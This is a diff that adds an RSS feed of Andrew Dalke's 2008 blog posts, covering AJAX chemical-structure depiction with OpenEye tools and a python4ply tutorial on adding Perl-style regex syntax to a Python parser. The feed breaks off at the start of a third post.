@@ -1,0 +1,2409 @@
+<?xml version="1.0" encoding="iso-8859-1"?>
+<rss version="2.0"><channel><title>Andrew Dalke's writings</title><link>http://www.dalkescientific.com/writings/diary/index.html</link><description>Writings from the software side of bioinformatics and
+  chemical informatics, with a heaping of Python thrown in for good
+  measure.  Code to taste.  Best served at room temperature.</description><lastBuildDate>Tue, 13 May 2008 01:33:01 GMT</lastBuildDate><generator>PyRSS2Gen-1.0.0</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><item><title>EuroCUP 2008 presentation</title><link>http://www.dalkescientific.com/writings/diary/archive/2008/05/12/eurocup2008.html</link><description>&lt;P&gt;
+
+The following is text to accompany my presentation for &lt;a
+href="http://www.eyesopen.com/about/events/cup-eurocup/eurocup2-program-details.html"&gt;EuroCUP
+2008&lt;/a&gt;.  I do not have a license for OEChem on my public facing web
+server machine so I cannot have a live demo for any of the code
+examples.
+
+&lt;/P&gt;&lt;P&gt;
+
+&lt;a href="http://dalkescientific.com/writings/EuroCUP2008-Dalke.pdf"&gt;Download the presentation as PDF&lt;/a&gt;.
+
+&lt;/P&gt;
+
+&lt;h1&gt;AJAX and the OpenEye Tools&lt;/h1&gt;
+
+&lt;P&gt;
+
+My name is &lt;a href="mailto:dalke@dalkescientific.com"&gt;Andrew
+Dalke&lt;/a&gt;.  I'm an independent software consultant and instrutor based
+in G&amp;ouml;teborg (Gothenburg), Sweden.  I mostly focus on developing
+computational chemistry tools and helping scientists become more
+capable in using computers to do their research.
+
+&lt;/P&gt;&lt;P&gt;
+[page 2]
+&lt;/P&gt;&lt;P&gt;
+
+Suppose you want a web page that shows a graphical 2D depiction of a
+compound given its SMILES.  One very traditional way to do this - the
+&lt;a href="http://www.daylight.com/daycgi/depict"&gt;Daylight libraries&lt;/a&gt;
+have supported it for over 10 years - is with a CGI script serving
+images based on the GET query parameters.  The HTML might look like
+
+&lt;pre class="code"&gt;
+&amp;lt;html&amp;gt;
+...
+&amp;lt;img src="/depict.cgi?smiles=CC(=O)Oc1ccccc1C(=O)O" /&amp;gt;
+...
+&amp;lt;/html&amp;gt;
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+The web page gets the HTML, figure out it needs an image, and makes an
+HTTP request to the src URL.  The web server, which is usually Apache,
+gets the request, converts it into a CGI request, and runs the program
+named "depict.cgi".  This program uses the CGI parameter to create the
+requested depiction.  In real life the CGI script may in turn call
+another program to do the actual depiction.
+
+&lt;/P&gt;&lt;P&gt;
+[page 3]
+&lt;/P&gt;&lt;P&gt;
+
+This interface was developed about 15 years ago and is still a valid
+way to write web applications.  There are many other ways to handle
+the interface between the outside world and the actual work which
+needs to be done.  The modern term for the different layers, which can
+include database access, session maintenance, and output templates,
+are now called the "web application stack."  &lt;a
+href="http://www.rubyonrails.org/"&gt;Ruby on Rails&lt;/a&gt; is a popular
+"full stack" system developed over the last 4, and &lt;a
+href="http://www.djangoproject.com/"&gt;Django&lt;/a&gt; and &lt;a
+href="http://turbogears.org/"&gt;TurboGears&lt;/a&gt; are roughly similar
+systems for Python.  All my examples are based on TurboGears.
+
+&lt;/P&gt;&lt;P&gt;
+[page 4]
+&lt;/P&gt;&lt;P&gt;
+
+The web server implementation should not affect how the web interface
+works.  That it, there should be no reason to change any of the URLs
+or get different HTML back from the server.  In practice though you a
+few things do change.  For example, using the extension ".cgi" in the
+URL is a bit of a cheat.  It's there because that's one way Apache can
+tell if a file is a data file or an executable CGI script.  In use
+it's a "&lt;a href="http://en.wikipedia.org/wiki/Leaky_abstraction"&gt;leaky
+abstraction&lt;/a&gt;" because it lets some of the internal implementation
+decisions leak into the public.  This can make it harder to port to
+other system.
+
+&lt;/P&gt;&lt;P&gt;
+
+In my case I'm using TurboGears, which by default doesn't do well with
+periods in the URL, so for my examples I'll remove the ".cgi" from the
+URL.
+
+&lt;/P&gt;&lt;P&gt;
+
+The TurboGears code is structured very similarly to the Apache code.
+An HTTP request comes in, TurboGears converts that into a Python
+function call (instead of CGI request), and calls the function that
+handles the request.  In this case that Python function doesn't know
+anything about chemistry.  It leaves the details up to OpenEye's ogham
+toolkit for 2D structure depiction.
+
+&lt;/P&gt;&lt;P&gt;
+
+The biggest architecture different is that everything is done through
+Python and Python libraries, and everything occurs in the same process
+space.  I don't have to start up a new program for every request.
+
+&lt;/P&gt;&lt;P&gt;
+
+By the way, if you're curious on how I get ogham to generate a PNG
+output as a string, rather than as a GIF or other non-PNG file, see my
+earlier essay on "&lt;a
+href="http://www.dalkescientific.com/writings/diary/archive/2007/05/23/oe8bitimage_to_png.html"&gt;OE8BitImage
+to PNG&lt;/a&gt;."  It was a fun bit of reverse engineering.
+
+&lt;/P&gt;&lt;P&gt;
+[page 5]
+&lt;/P&gt;&lt;P&gt;
+
+My web page example had a single hard-coded SMILES.  What if I want
+something more interactive, where the user can input a SMILES and see
+the depiction image?  I'll do this with an HTML form, which sends the
+"smiles" parameter to the "/depict" service on the web browser.  This
+is the same service I used for the HTML image.
+
+&lt;/P&gt;&lt;P&gt;
+[page 6]
+&lt;/P&gt;&lt;P&gt;
+
+Viewing just the image is very static.  The image just sits there.  I
+would rather see the structure I submitted and also have a form for
+submitting a new SMILES to depict.  In this case I'll submit the form
+to a new "/show_depict" handler, which will respond with HTML that
+includes an img element for requested SMILES and includes the form for
+doing a new "/show_depict" depiction.  Note that this requires two
+requests to the server; the first to "/show_depict" for the HTML and
+and the second to "/depict" to get the depiction image.
+
+&lt;/P&gt;&lt;P&gt;
+[page 7]
+&lt;/P&gt;&lt;P&gt;
+
+By using HTML forms I've now advanced to HTML 2.0, which was formally
+specified in 1995.  At the end of that year, Netscape Navigator
+introduced Javascript, which people originally used for doing form
+input validation.  People make mistakes, and while hopefully the
+server is doing a layer of sanity checking, it still may take some
+time for the sent form to go the server and come back again.  A
+Javascript program can make things feel more interactive by sitting
+inside of the web page where it can access HTML and form elements and
+handle events like ""form submitted."
+
+&lt;/P&gt;&lt;P&gt;
+
+The only difference in the HTML is the img src URL, so instead of
+submitting the form each time to the server, I'm going to listen for
+the "submit" event using Javascript.  When that occurs I'll reach into
+the document (the formal term is the "document object mode", or "DOM")
+and change the URL, then tell the browser that there's no need to do
+the actual submission.
+
+&lt;/P&gt;&lt;P&gt;
+[page 8]
+&lt;/P&gt;&lt;P&gt;
+
+Here's how the HTML form looks like.  I've added an "onsubmit" handler
+to the form, which is a bit of Javascript to call on form submission,
+and I've given identifiers to the SMILES input text box and to the
+depiction image, to make them easier to find later on.
+
+&lt;/P&gt;&lt;P&gt;
+[pages 9 and 10]
+&lt;/P&gt;&lt;P&gt;
+
+Here's the HTML fully fleshed out.  The "onsubmit" handler calls the
+Javascript function "update_image()".  This gets the text from the
+"smiles" field and finds the "description" image element.  It then
+sets the description's "src" field to a URL based on the SMILES.  I
+use the "escape" function because the user input may contain
+characters that have special meaning in URLs, like "/".  The "return
+false" tells the browser that it does not need to send the form to the
+server.
+
+&lt;/P&gt;
+&lt;h2&gt;This is out-dated!&lt;/h2&gt;
+
+&lt;P&gt;
+[page 11]
+&lt;/P&gt;&lt;P&gt;
+
+I could go into more details but I won't, because what you see here is
+out-dated.  This was state of the art about 6-8 years ago, but in
+practice there are problem with it.  For example, it's hard to make
+components with it, like the ability to have multiple depictors in the
+same page.  It mixes HTML and Javascript in the same file, which is
+harder to develop with and it confuses text editors.  There's also the
+unfortunate problem that browsers have bugs.  IE is known for its
+memory leaks in the face of circular references.  There are
+workarounds, but learning them all takes time.
+
+&lt;/P&gt;&lt;P&gt;
+
+Thankfully there are better ways to develop Javascript tools.  Most of
+the best practices and workarounds are available through Javascript
+libraries like &lt;a href="http://jquery.com/"&gt;jQuery&lt;/a&gt;, &lt;a
+href="http://developer.yahoo.com/yui/"&gt;YUI&lt;/a&gt;, and &lt;a
+href="http://mochikit.com/"&gt;MochiKit&lt;/a&gt;.
+
+&lt;/P&gt;&lt;P&gt;
+[page 12]
+&lt;/P&gt;&lt;P&gt;
+
+Here's the same form rewritten for use with jQuery.  You see at the
+time I include the jQuery code, which is available as a single file
+from this URL.  I then have a script block that sets up the
+interactive page.  What this is saying is:
+
+&lt;pre class="code"&gt;
+  When the document is fully loaded (that is, all the HTML has been parsed),
+    Find the elements with tag name "form" (there is only one)
+      When its submit button is pressed ...
+        call this anonymous function.  ("anonymous" means "does not have a name")
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+Javascript allows "$" in a variable name.  jQuery defines a special
+function named just "$" combines a selection language and a wrapper
+object.  "$(document)" means "select the document object from
+Javascript and wrap it inside of a jQuery context."  That context is
+what lets you do ".ready()" and ".submit()".  If the function call
+gets a string then jQuery uses a sort of XPath language to select
+fields from the DOM.  '$("form")' means "select all HTML elements
+named "form" while '$("#smiles")' means "select all HTML elements
+where the 'id' is 'smiles'.
+
+&lt;/P&gt;&lt;P&gt;
+
+The anonymous submit function does the following:
+
+&lt;pre class="code"&gt;
+Select the "#smiles" element (that's the element with id 'smiles').
+Get it's "val" property, which in this case is the input text for that field.
+Escape it to make a depiction URL.
+Assign the URL to the "src" attribute of the "#depiction" element (the element
+   with id 'depiction')
+Finally, "return false" to tell the browser it does not need to send the form.
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+This code is bit longer than the preceeding Javascript example, but
+that's only going to be the case for very simple examples like this.
+Otherwise the jQuery code is usually shorter, more succinct, and
+easier to understand, once you understand how jQuery works.  It also
+separates the Javascript code completely from the HTML.
+
+&lt;/P&gt;&lt;P&gt;
+[pages 13 and 14]
+&lt;/P&gt;&lt;P&gt;
+
+I can make the interface still more interactive.  The OpenEye
+depiction code is quite fast.  Instead of waiting for the form
+submission I could update the image src URL after every keystroke.
+Sadly, this turns out to be complicated to do correctly.  Javascript
+supports "keydown", "keyup", and "keypress" events, which sound like
+the right things.  The problem is, the text isn't updated until after
+the event succeeds.  Why?  Because it's used for key input filtering.
+The Javascript handler can "return false" to tell the browser to
+ignore a given key.
+
+&lt;/P&gt;&lt;P&gt;
+
+It's also complicated because things like "control-v" for "paste", and
+"home" for "go to start of the input", and the backspace key are also
+handled as key input, but aren't simple changes to the text field.
+The easiest solution I found was to wait until after the event
+happens, let the browser do whatever is appropriate to the key input,
+and only then examine the contents of the text field.
+
+&lt;/P&gt;&lt;P&gt;
+
+I'm going to use MochiKit for this, which is another Javascript
+library.  MochiKit is great for Python programmers like me because it
+makes Javascript feel more like Python.  It adds mostly core-level
+libraries to simplify event handling, iteration, and DOM manipulation.
+There is some functionality overlap to jQuery, but they do work pretty
+well together.  The only thing to watch out for is by default both
+want to define the '$' function.
+
+&lt;/P&gt;&lt;P&gt;
+
+Don't be put off by seeing that MochiKit's last release was in 2006.
+It's a stable, well-developed and mature library.
+
+&lt;/P&gt;&lt;P&gt;
+
+I import the MochiKit functionality with the usual &amp;lt;script&amp;gt; tag.
+Once the document is loaded and ready, I add a "keydown" handler on
+the "#smiles" element.  This anonymous function will be called after
+every key press.  But all the function does is ask the browser to call
+another function, "update_image", 0 seconds later.  The browser adds
+it to the wait queue of function calls be done at some time in the
+future.  These calls are only done when no event handler is being
+processed.  (The Javascript code in a page is single-threaded by
+design.)  The result is that "update_image" will be called most likely
+as soon as the keydown event is processed.
+
+&lt;/P&gt;&lt;P&gt;
+
+The "update_image" function should be very familiar.  It's the code
+that extracts the text value from the "#smiles" element, constructs
+the image URL, and assigns it to the "#depiction" element's "src"
+field.
+
+&lt;/P&gt;&lt;P&gt;
+
+One of the many nice things about the OpenEye toolkit is it will
+handle partial SMILES strings as input.  OEParseSmiles parses as much
+as it can understand and return True on success.  If it returns False
+then the SMILES was not correct or was incomplete, but the molecule
+object will contain as much of the molecule as it was able to parse.
+It's a valid molecule object, and the depiction code has no problems
+laying it out.
+
+&lt;/P&gt;
+
+&lt;h2&gt;JSON request&lt;/h2&gt;
+
+&lt;P&gt;
+[page 15]
+&lt;/P&gt;&lt;P&gt;
+
+The example I depicts the molecule while typing in the SMILES string.
+I'm going to change it a bit and also display the IUPAC name for the
+SMILES string using OpenEye's naming code on the server.  Again, this
+will be a highly interactive server where I can see the name while I
+am typing it.
+
+&lt;/P&gt;&lt;P&gt;
+
+This is a bit more complex than the image example because I need data
+from the server.  I want to know if the SMILES string is a valid
+SMILES string (it could be an incomplete input) and the IUPAC name for
+the molecule, or at least as much of the input as OEParseSmiles could
+understand.
+
+&lt;/P&gt;&lt;P&gt;
+
+I'll do this by creating a new web service called "smi2name."  It's a
+normal GET request that takes a "smiles" as its only input parameter
+and return a "&lt;a href="http://www.json.org/"&gt;JSON&lt;/a&gt;" document.  JSON
+is a special data format in "JavaScript Object Notation", which is
+very fast for web browsers to handle as they already have code for
+dealing with Javascript code.  This is a common technique in modern
+Javascript code and most libraries, including MochiKit, have code to
+make it easy to do.
+
+&lt;/P&gt;&lt;P&gt;
+
+At the bottom you can see an example JSON document that would be
+returned by this service.  It's a Javascript dictionary containing a
+"status" field, which is either "valid" or "invalid", and a "name"
+field, containing the OpenEye's IUPAC name assignment.
+
+&lt;/P&gt;&lt;P&gt;
+[page 16]
+&lt;/P&gt;&lt;P&gt;
+
+My one change to the HTML is to include a "Name: " field below the
+image, which is where the IUPAC name will go.  That's a label and an
+empty text span element, with the id "compound_name."
+
+&lt;/P&gt;&lt;P&gt;
+[page 17]
+&lt;/P&gt;&lt;P&gt;
+
+Here's the modified Javascript code for that case.  You'll recognize
+the first half of the code.  The "&lt;a
+href="http://mochikit.com/doc/html/MochiKit/Async.html#fn-loadjsondoc"&gt;loadJSONDoc&lt;/a&gt;"
+is the MochiKit call to simplify making a JSON request.  I give it the
+URL to call and an optional dictionary of query arguments.  Requests
+like this are asynchronous, meaning that the Javascript has asked the
+browser to fetch the URL but it's not going to get the result right
+away.
+
+&lt;/P&gt;&lt;P&gt;
+
+Instead, MochiKit returns what's called a "&lt;a
+href="http://mochikit.com/doc/html/MochiKit/Async.html#fn-deferred"&gt;Deferred&lt;/a&gt;"
+object.  I can configure it to call "show_compound_name" once the JSON
+document has been fetched and parsed into a normal Javascript data
+structure.
+
+&lt;/P&gt;&lt;P&gt;
+
+The callback function is named "show_compound_name".  The JSON
+document contains a Javascript dictionary, so I can get figure out if
+the input SMILES was valid or not and color the result black if it was
+valid or red if it was invalid.
+
+&lt;/P&gt;&lt;P&gt;
+
+The last line of real code shows jQuery's function call chaining.  The
+'$("#compound_name")' selects the element with id "compound_name",
+which is the text span.  The ".text(smi2name_result.name)" gets the
+"name" from the results dictionary and assigns it to the text content
+of the spam element.  This is what displays the name to the user.
+
+&lt;/P&gt;&lt;P&gt;
+
+The result of calling ".text(...)" is the same query object.  I can
+use it to change other properties of my selection.  So I'll change the
+CSS "color" property and so it shows the red or black status value.
+
+&lt;/P&gt;&lt;P&gt;
+[page 18]
+&lt;/P&gt;&lt;P&gt;
+
+In case you're curious, here's most of the code on the server to
+implement "smi2name" using TurboGears.  I left out only the
+scaffolding code that TurboGears writes for you and the lines to
+import the right OpenEye libraries into the Python module.
+
+&lt;/P&gt;
+&lt;h2&gt;Demo&lt;/h2&gt;
+&lt;P&gt;
+[page 19]
+&lt;/P&gt;&lt;P&gt;
+
+Last summer I spent a month learning how to use modern Javascript
+tools.  My experimental test case was a 2D structure viewer widget.  I
+developed a demo for it, and recorded an &lt;a
+href="http://www.dalkescientific.com/writings/diary/archive/2007/07/27/structure_viewer_demo.html"&gt;screencast&lt;/a&gt;.
+
+&lt;/P&gt;&lt;P&gt;
+[page 20]
+&lt;/P&gt;&lt;P&gt;
+
+The hardest part to get working was the mouseover support for the
+depiction.  I ended up making extensive use of CSS, which tells the
+web page how to lay out a page.  I used 4 layers on top of each other
+to get things working.  The bottom layer is the Ogham depiction, and
+is the PNG image you've seen elsewhere.  This is generated on the web
+server but only needs to change if the SMILES or the image size
+changes.
+
+&lt;/P&gt;&lt;P&gt;
+
+On top of that, the third layer is a semi-transparent image showing
+which atoms have been selected, either from mouse selection or from
+the SMARTS/atom index selection.  This must occur on the server
+because that's what understands SMARTS, and must be recreated if the
+size or SMILES changes.
+
+&lt;/P&gt;&lt;P&gt;
+
+The top two layers are for mouseover support.  The top layer is a
+transparent image containing only an image map.  Each hotspot on the
+map is a circle, centered on the center of an atom.  I use this to
+tell if the mouse is over an atom.  If the image size changes then I
+make a JSON request to the server to get the new atom locations and
+scaled atom radius.
+
+&lt;/P&gt;&lt;P&gt;
+
+The second layer contains a small PNG with a circle and a transparent
+background.  There's a bit of Javascript which connects the
+"mouseover"/"mouseout" events from the first layer to move the circle
+around in the second layer.  The result is a fast, client-side
+highlighting of the atom the mouse is over.
+
+&lt;/P&gt;&lt;P&gt;
+
+The four layers are aligned so to the user it looks like one coherent
+view, despite the implementation complexity.
+
+&lt;/P&gt;
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2008/05/12/eurocup2008.html</guid><pubDate>Mon, 12 May 2008 12:00:00 GMT</pubDate></item><item><title>python4ply tutorial, part 3</title><link>http://www.dalkescientific.com/writings/diary/archive/2008/03/10/python4ply_tutorial_3.html</link><description>&lt;P&gt;
+
+The following is an except from the
+&lt;a href="http://dalkescientific.com/Python/python4ply.html"&gt;python4ply&lt;/a&gt;
+&lt;a href="http://dalkescientific.com/Python/python4ply-tutorial.html"&gt;tutorial&lt;/a&gt;.
+python4ply is a Python parser for the Python language using PLY and
+the 'compiler' module from the standard library to parse Python code
+and generate bytecode for the Python virtual machine.
+
+&lt;/P&gt;
+
+&lt;h2&gt;Creating regular expression pattern objects&lt;/h2&gt;
+
+&lt;P&gt;
+
+Regular expressions are fun.  The first contact I had with them was
+through DOS globbing, where "*.*" matched all files with an extension.
+Then I started using Unix, and started using Archie, which supported
+regular expressions.  Hmm, that was in 1990.  I read the documentation
+for regexps but I didn't understand them.  Instead I mentally
+translated the glob "?" to "." and the glob "*" to ".*".
+
+&lt;/P&gt;&lt;P&gt;
+
+Luckily for me I was in college and I took a theory of automata
+course.  I loved that course.  It taught me a lot about how to think
+about computers as what they are - glorified state machines.
+
+&lt;/P&gt;&lt;P&gt;
+
+Other programmers also really like regular expressions, and languages
+like Perl, Ruby, and Javascript consider them so important that are
+given syntax level support.  Python is not one of those languages, and
+someone coming from Ruby, where you can do
+
+&lt;pre class="code"&gt;
+# lines.rb
+File.open("python_yacc.py").each do |line|
+  if line =~ /def (\w+)/
+    puts "#{$1}\n"
+  end  
+end
+&lt;/pre&gt;
+
+will probably find the corresponding Python both tedious and (because
+of the separation between the pattern definition and use) harder to
+read:
+
+&lt;pre class="code"&gt;
+# lines.py
+import re
+
+pattern = re.compile(r"def (\w+)")
+
+for line in open("python_yacc.py"):
+    m = pattern.match(line)
+    if m is not None:
+        print m.group(1)
+&lt;/pre&gt;
+
+This code is generally considered the best practice for Python.  It
+could be made a bit shorter by using re.match instead of the
+precompiled pattern, but at the cost of some performance.
+
+&lt;/P&gt;&lt;P&gt;
+
+I'll give Perl5 regular expressions (as implemented by the 're'
+module) first-class syntax support for creating patterns.  That will
+shorten the code by getting rid of the "import re" and the
+"re.compile()" call.  Here's how I want the pattern creation to look
+like
+
+&lt;pre class="code"&gt;
+pattern = m/def (\w+)/
+&lt;/pre&gt;
+
+This new syntax is vaguely modelled after Perl's.  It must start with
+a "m/" and end with a "/" on the same line.  Note that my new syntax
+might break existing code because
+
+&lt;pre class="code"&gt;
+m=12
+a=3
+i=2
+print m/a/i
+&lt;/pre&gt;
+
+is already valid.
+
+&lt;/P&gt;&lt;P&gt;
+
+The new token definition goes before the t_NAME definition, to prevent
+the NAME from matching first.  This token returns a 2-ple of the
+regular expression pattern as a string, and the flags to pass to
+re.compile.  I need to pass it back as basic types and not a pattern
+object because the bytecode generation only understands the basic
+Python types.
+
+&lt;pre class="code"&gt;
+&lt;b&gt;import re
+_re_flags = {
+    "i": re.IGNORECASE,
+    "l": re.LOCALE,
+    "m": re.MULTILINE,
+    "s": re.DOTALL,
+    #"x": re.VERBOSE, # not useful in this context
+    "u": re.UNICODE,
+}
+def t_PATTERN(t):
+    r"m/[^/]*/[a-z]*"
+    m, pattern, opts = t.value.split("/")
+    
+    flags = 0
+    for c in opts:
+        flag = _re_flags.get(c, None)
+        if flag is None:
+            # I could pin this down to the specific character position
+            raise_syntax_error(
+                "unsupported pattern modifier %r" % (c,), t)
+        flags |= flag
+    # test compile to make sure that it's a valid pattern
+    try:
+        re.compile(pattern, flags)
+    except re.error, err:
+        # Sadly, re.error doesn't include the error position
+        raise_syntax_error(err.message, t)
+    t.value = (pattern, flags)
+    return t&lt;/b&gt;
+
+
+# This goes after the strings otherwise r"" is seen as the NAME("r")
+def t_NAME(t):
+    r"[a-zA-Z_][a-zA-Z0-9_]*"
+    t.type = RESERVED.get(t.value, "NAME")
+    return t
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+This PATTERN will be a new "atom" at the grammar level, which will
+correspond to a call to re.compile("pattern", options). 
+&lt;pre class="code"&gt;
+&lt;b&gt;def p_atom_13(p):
+    'atom : PATTERN'
+    pattern, flags = p[1]
+    p[0] = ast.CallFunc(ast.Name("_$re_compile"), [ast.Const(pattern),
+                                                   ast.Const(flags)])
+    locate(p[0], p.lineno(1))&lt;/b&gt;
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+See how I'm using the impossible variable name '_$re_compile'?  That's
+going to be "re.compile" and I'll use the same trick I did with the
+DECIMAL support and insert the AST corresponding to
+
+&lt;pre class="code"&gt;
+from re import compile as _$compile
+&lt;/pre&gt;
+
+at the start of the module definition,
+
+&lt;pre class="code"&gt;
+def p_file_input_2(p):
+    "file_input : file_input_star ENDMARKER"
+    stmt = ast.Stmt(p[1])
+    locate(stmt, p[1][0].lineno)#, bounds(p[1][0], p[1][-1]))
+    docstring, stmt = extract_docstring(stmt)
+    &lt;b&gt;stmt.nodes.insert(0, ast.From("re", [("compile", "_$re_compile")], 0))&lt;/b&gt;
+    p[0] = ast.Module(docstring, stmt)
+    locate(p[0], 1)#, (None, None))
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+I'll test this with a simple program
+
+&lt;pre class="code"&gt;
+# pattern_test.py
+data = "name: Andrew Dalke   country:  Kingdom of Sweden "
+pattern = m/Name: *(\w.*?) *Country: *(\w.*?) *$/i
+m = pattern.match(data)
+if m:
+    print repr(m.group(1)), "lives in", repr(m.group(2))
+else:
+    print "unknown"
+&lt;/pre&gt;
+
+&lt;pre class="code"&gt;
+% python compile.py -e pattern_test.py 
+'Andrew Dalke' lives in 'Kingdom of Sweden'
+%
+&lt;/pre&gt;
+and to see that it generates byte code
+
+&lt;pre class="code"&gt;
+% python compile.py  pattern_test.py
+Compiling 'pattern_test.py'
+% rm pattern_test.py
+% python -c 'import pattern_test'
+'Andrew Dalke' lives in 'Kingdom of Sweden'
+%
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+&lt;h2&gt;Adding a match operator&lt;/h2&gt;
+
+&lt;P&gt;
+
+These changes make it easier to define a pattern, but not to use it.
+As another example of (fake?) Perl envy.  I'm going to support its
+"=~" match syntax so that the following is valid:
+
+&lt;pre class="code"&gt;
+# count_atoms.py
+import time
+
+# Count the number of atoms in a PDB file
+# Lines to match looks like:
+# ATOM   6312  CB  ALA 3 235      24.681  54.463 137.827  1.00 51.30
+# HETATM 6333  CA  MYR 4   1       6.722  54.417  88.584  1.00 50.79
+count = 0
+t1 = time.time()
+for line in open("nucleosome.pdb"):
+  if line =~ m/(ATOM  |HETATM)/:
+      count += 1
+print count, "atoms in", time.time()-t1, "seconds"
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+This turned out to be very simple.  I need a new token for "=~".  Most
+of the simple tokens are defined in "python_tokens.py".  I added
+"EQUALMATCH" in the list of tokens in the place shown here
+
+&lt;pre class="code"&gt;
+ ...
+PERCENTEQUAL %=
+AMPEREQUAL &amp;=
+CIRCUMFLEXEQUAL ^=
+EQUALMATCH =~
+
+COLON :
+COMMA ,
+ ...
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+Note that this will break legal existing code, like
+
+&lt;pre class="code"&gt;
+&amp;gt;&amp;gt;&amp;gt; a=~2
+&amp;gt;&amp;gt;&amp;gt; a
+-3
+&amp;gt;&amp;gt;&amp;gt; 
+&lt;/pre&gt;
+
+The lexer doesn't need anything else because I've already defined a
+PATTERN token.
+
+&lt;/P&gt;&lt;P&gt;
+
+I need to decide the precedence level of =~.  Is it as strong as "**"
+or as weak as "or", or some place in between?  I decided to make it as
+weak as "or", which is defined by the "test" definition.  Here's my
+new "p_test_4" function:
+
+&lt;pre class="code"&gt;
+&lt;b&gt;def p_test_4(p):
+    'test : or_test EQUALMATCH PATTERN'
+    # pattern.search(or_test)
+    sym = gensym("_$re-")
+    pattern, flags = p[3]
+    p.parser.patterns.append((sym, pattern, flags))
+    p[0] = ast.Compare(
+        ast.CallFunc(ast.Getattr(ast.Name(sym), 'search'), [p[1]], None, None),
+        [("is not", ast.Name("None"))])
+    locate(p[0], p.lineno(2))&lt;/b&gt;
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+I got the AST definition by looking at
+
+&lt;pre class="code"&gt;
+&amp;gt;&amp;gt;&amp;gt; from compiler import parse
+&amp;gt;&amp;gt;&amp;gt; parse("pat.search(line) is not None")
+Module(None, Stmt([Discard(Compare(CallFunc(Getattr(Name('pat'), 'search'),
+[Name('line')], None, None), [('is not', Name('None'))]))]))
+&amp;gt;&amp;gt;&amp;gt; 
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+And that's it!  Well, I could add an optimization in this case and
+move the ".search" outside the loop, but that's an exercise left for
+the student.
+
+&lt;/P&gt;&lt;P&gt;
+Now I'll put a toe into evil, just to see how cold it is.  I'm going
+to add support for
+
+&lt;pre class="code"&gt;
+# get_function_names.py
+for line in open("python_yacc.py"):
+    if line =~ m/def (\w+)/:
+        print repr($1)
+&lt;/pre&gt;
+
+That is, if the =~ matches then $1, $2, ... will match group 1, 2.
+Oh, and while I'm at it, if there's a named group then $name will
+retrieve it.  And '$' will mean to get the match object itself.
+
+&lt;/P&gt;&lt;P&gt;
+
+To make it work I need some way to do assignment in the expression.
+Python doesn't really support that except through a hack I don't want
+to use, so I'll use another hack and change the bytecode generation
+stage.
+
+&lt;/P&gt;&lt;P&gt;
+
+I created a new AST node called "AssignExpr" which is like an "Assign"
+node except that it can be used in an expression.  The compiler module
+doesn't know about it and it's hard to change the code through
+subclassing, so I patch the compiler and its bytecode generation code
+so it understands the new node type.  These changes are in
+"compiler_patches.py" and the patches are done when the module is
+imported.  Take a look at the module if you want to see what it does.
+
+&lt;/P&gt;&lt;P&gt;
+
+It doesn't escape my notice that with AssignExpr there's only a
+handful of lines needed for support assignment in an expression, like
+
+&lt;pre class="code"&gt;
+if line = readline():
+    print repr(line)
+&lt;/pre&gt;
+
+Before you do that yourself, read the Python &lt;a
+href="http://www.python.org/doc/faq/general/#why-can-t-i-use-an-assignment-in-an-expression"&gt;FAQ&lt;/a&gt;
+for why Python doesn't support this.
+
+&lt;/P&gt;&lt;P&gt;
+
+To support the new pattern match syntax I need to make two changes to
+python_yacc.py.  The first is to import the monkeypatch module:
+
+&lt;pre class="code"&gt;
+import compiler_patches
+&lt;/pre&gt;
+
+then make the changes to the p_test_4 function to save the match
+object to the variable "$".
+
+&lt;pre class="code"&gt;
+def p_test_4(p):
+    'test : or_test EQUALMATCH PATTERN'
+    # pattern.search(or_test)
+    sym = gensym("_$re-")
+    pattern, flags = p[3]
+    p.parser.patterns.append((sym, pattern, flags))
+    p[0] = ast.Compare(
+&lt;b&gt;        ast.AssignExpr([ast.AssName("$", "OP_ASSIGN")],
+                       ast.CallFunc(ast.Getattr(ast.Name(sym), 'search'),
+                                    [p[1]], None, None)),&lt;/b&gt;
+        [("is not", ast.Name("None"))])
+    locate(p[0], p.lineno(2))
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+Does it work?  Try this program, which is based on the Ruby code I
+started with at the start of this tutorial section, oh so long ago.
+
+
+&lt;pre class="code"&gt;
+# get_function_names.py
+for line in open("python_yacc.py"):
+    if line =~ m/def (\w+)/:
+        # I don't yet have syntax support to get to the special '$'
+        # variable so I have to get it from the globals dictionary.
+        print repr(globals()["$"].group(1))
+&lt;/pre&gt;
+
+&lt;pre class="code"&gt;
+% python compile.py -e get_function_names.py
+'gensym'
+'raise_syntax_error'
+'locate'
+'bounds'
+'text_bounds'
+'extract_docstring'
+'__init__'
+'__init__'
+'add_arg'
+'add_star_arg'
+'p_file_input_1'
+'p_file_input_2'
+'p_file_input_star_1'
+'p_file_input_star_2'
+'p_file_input_star_3'
+    ...
+&lt;/pre&gt;
+
+&lt;/P&gt;&lt;P&gt;
+
+Sweet!
+
+&lt;/P&gt;&lt;P&gt;
+
+With a bit more work (described in detail in the tutorial), I changed
+the parser to allow this Perl/Python fusion syntax.
+
+&lt;pre class="code"&gt;
+# get_function_names.py
+for line in open("python_yacc.py"):
+    if line =~ m/def (?P&amp;lt;name&amp;gt;\w+) *(?P&amp;lt;args&amp;gt;\(.*\)) *:/:
+        print repr($1), repr($args)
+&lt;/pre&gt;
+
+&lt;/P&gt;
+
+</description><guid isPermaLink="true">http://www.dalkescientific.com/writings/diary/archive/2008/03/10/python4ply_tutorial_3.html</guid><pubDate>Mon, 10 Mar 2008 12:00:00 GMT</pubDate></item><item><title>python4ply tutorial, part 2</title><link>http://www.dalkescientific.com/writings/diary/archive/2008/03/09/python4ply_tutorial_2.html</link><description>&lt;P&gt;
+
+The following is an except from the
+&lt;a href="http://dalkescientific.com/Python/python4ply.html"&gt;python4ply&lt;/a&gt;
